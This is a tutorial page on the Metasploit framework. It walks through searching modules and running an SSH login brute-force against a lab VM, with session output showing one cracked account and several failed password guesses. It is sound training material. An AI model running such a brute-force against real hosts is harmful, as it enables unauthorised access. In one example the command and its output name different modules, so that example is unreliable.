.. _metasploitpage:

Metasploit
==========
Metasploit_ is an open-source penetration testing framework tool, a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. 

Metasploit_ has become the go-to exploit development and mitigation tool.
Prior to Metasploit_, pentesters had to perform all probes manually by using a variety of tools that may or may not have supported the platform they were testing, writing their own code by hand, and introducing it onto networks manually.

Metasploit_ provides you with modules for:

- ``Exploits`` tool used to take advantage of system weaknesses
- ``Payloads`` set of malicious code
- ``Auxiliary Functions`` supplementary tools and commands
- ``Encoders`` used to convert code or information
- ``Listeners`` malicious software that hides in order to gain access
- ``Shellcode`` code that is programmed to activate once inside the target
- ``post-exploitation code`` helps test depper penetration once inside
- ``Nops`` an instruction to keep the payload from crashing

.. _Metasploit: https://www.metasploit.com/

Usage and Example
-----------------
.. note::

    This example utilizes :ref:`Dinero VM<dinero>`.

Since Metasploit_ is quite a huge framework, there are many ways to take advantage of it.

To open Metasploit_ console, use ``msfconsole``:

.. code-block:: console

    msfconsole

From here, you can ``search`` for many tools and modules:

.. code-block:: console

    msf > search name:ssh type:auxiliary

    Matching Modules
    ================

    #   Name                                            Disclosure Date  Rank    Check  Description
    -   ----                                            ---------------  ----    -----  -----------
    0   auxiliary/admin/http/cisco_7937g_ssh_privesc    2020-06-02       normal  No     Cisco 7937G SSH Privilege Escalation
    1   auxiliary/scanner/ssh/eaton_xpert_backdoor      2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
    2   auxiliary/scanner/ssh/fortinet_backdoor         2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
    3   auxiliary/scanner/ssh/juniper_backdoor          2015-12-20       normal  No     Juniper SSH Backdoor Scanner
    4   auxiliary/scanner/ssh/detect_kippo                               normal  No     Kippo SSH Honeypot Detector
    5   auxiliary/fuzzers/ssh/ssh_version_15                             normal  No     SSH 1.5 Version Fuzzer
    6   auxiliary/fuzzers/ssh/ssh_version_2                              normal  No     SSH 2.0 Version Fuzzer
    7   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                        normal  No     SSH Key Exchange Init Corruption
    8   auxiliary/scanner/ssh/ssh_login                                  normal  No     SSH Login Check Scanner
    9   auxiliary/scanner/ssh/ssh_identify_pubkeys                       normal  No     SSH Public Key Acceptance Scanner
    10  auxiliary/scanner/ssh/ssh_login_pubkey                           normal  No     SSH Public Key Login Scanner
    11  auxiliary/scanner/ssh/ssh_enumusers                              normal  No     SSH Username Enumeration
    12  auxiliary/fuzzers/ssh/ssh_version_corrupt                        normal  No     SSH Version Corruption
    13  auxiliary/scanner/ssh/ssh_version                                normal  No     SSH Version Scanner
    14  auxiliary/dos/windows/ssh/sysax_sshd_kexchange  2013-03-17       normal  No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
    15  auxiliary/scanner/ssh/ssh_enum_git_keys                          normal  No     Test SSH Github Access
    16  auxiliary/scanner/ssh/libssh_auth_bypass        2018-10-16       normal  No     libssh Authentication Bypass Scanner


    Interact with a module by name or index. For example info 16, use 16 or use auxiliary/scanner/ssh/libssh_auth_bypass

.. note::

    You can run ``help search`` to list all searchable keywords.


You can also look for information regarding a module using ``info``:

.. code-block:: console

    msf > info auxiliary/admin/http/iis_auth_bypass

            Name: SSH Login Check Scanner
          Module: auxiliary/scanner/ssh/ssh_login
         License: Metasploit Framework License (BSD)
            Rank: Normal

     Provided by:
       todb <todb@metasploit.com>

     Check supported:
       No

     Basic options:
       Name              Current Setting  Required  Description
       ----              ---------------  --------  -----------
       BLANK_PASSWORDS   false            no        Try blank passwords for all users
       BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
       DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
       DB_ALL_PASS       false            no        Add all passwords in the current database to the list
       DB_ALL_USERS      false            no        Add all users in the current database to the list
       DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
       PASSWORD                           no        A specific password to authenticate with
       PASS_FILE                          no        File containing passwords, one per line
       RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
       RPORT             22               yes       The target port
       STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
       THREADS           1                yes       The number of concurrent threads (max one per host)
       USERNAME                           no        A specific username to authenticate as
       USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
       USER_AS_PASS      false            no        Try the username as the password for all users
       USER_FILE                          no        File containing usernames, one per line
       VERBOSE           false            yes       Whether to print output for all attempts

     Description:
       This module will test ssh logins on a range of machines and report 
       successful logins. If you have loaded a database plugin and 
       connected to a database this module will record successful logins 
       and hosts so you can track your access.

     References:
       https://nvd.nist.gov/vuln/detail/CVE-1999-0502

To select and ``use`` a module:

.. code-block:: console

    msf > use auxiliary/scanner/ssh/ssh_login

To show the module options using ``show options``:

.. code-block:: console

    msf auxiliary(scanner/ssh/ssh_login) > show options

    Module options (auxiliary/scanner/ssh/ssh_login):

    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
    BLANK_PASSWORDS   false            no        Try blank passwords for all users
    BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
    DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
    DB_ALL_PASS       false            no        Add all passwords in the current database to the list
    DB_ALL_USERS      false            no        Add all users in the current database to the list
    DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
    PASSWORD                           no        A specific password to authenticate with
    PASS_FILE                          no        File containing passwords, one per line
    RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT             22               yes       The target port
    STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
    THREADS           1                yes       The number of concurrent threads (max one per host)
    USERNAME                           no        A specific username to authenticate as
    USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
    USER_AS_PASS      false            no        Try the username as the password for all users
    USER_FILE                          no        File containing usernames, one per line
    VERBOSE           false            yes       Whether to print output for all attempts

To ``set`` the module options:

.. code-block:: console

    msf auxiliary(scanner/ssh/ssh_login) > set USER_FILE users.txt
    USER_FILE => users.txt
    msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE passes.txt
    PASS_FILE => passes.txt
    msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.233.128
    RHOSTS => 192.168.233.128
    msf auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
    VERBOSE => true

To ``run`` the module:

.. code-block:: console

    msf auxiliary(scanner/ssh/ssh_login) > run

    [*] 192.168.233.128:22 - Starting bruteforce
    [+] 192.168.233.128:22 - Success: 'juarez:D!@D3105T0nt05' 'uid=1000(juarez) gid=1000(juarez) groups=1000(juarez),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) Linux dinero 4.15.0-176-generic #185-Ubuntu SMP Tue Mar 29 17:40:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] SSH session 1 opened (192.168.233.131:42275 -> 192.168.233.128:22 ) at 2022-07-12 01:34:09 -0400
    [-] 192.168.233.128:22 - Failed: 'sarahj:D!@D3105T0nt05'
    [-] 192.168.233.128:22 - Failed: 'sarahj:S@R@H1Tm@n24u'
    [-] 192.168.233.128:22 - Failed: 'sarahj:12215myf120rit3NuMB@@RR'
    [-] 192.168.233.128:22 - Failed: 'sarahj:J3p50Nap5P@55w0rd'
    [-] 192.168.233.128:22 - Failed: 'wanderson122:D!@D3105T0nt05'
    [-] 192.168.233.128:22 - Failed: 'wanderson122:S@R@H1Tm@n24u'
    [-] 192.168.233.128:22 - Failed: 'wanderson122:12215myf120rit3NuMB@@RR'
    [-] 192.168.233.128:22 - Failed: 'wanderson122:J3p50Nap5P@55w0rd'
    [-] 192.168.233.128:22 - Failed: 'jepson:D!@D3105T0nt05'
    [-] 192.168.233.128:22 - Failed: 'jepson:S@R@H1Tm@n24u'
    [-] 192.168.233.128:22 - Failed: 'jepson:12215myf120rit3NuMB@@RR'
    [-] 192.168.233.128:22 - Failed: 'jepson:J3p50Nap5P@55w0rd'
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

.. note::

    If the module is an ``exploit``, use ``exploit`` to run the module.

.. note::

    To learn more about how to use Metasploit_, visit `TutorialsPoint Metasploit Tutorial <https://www.tutorialspoint.com/metasploit/index.htm>`_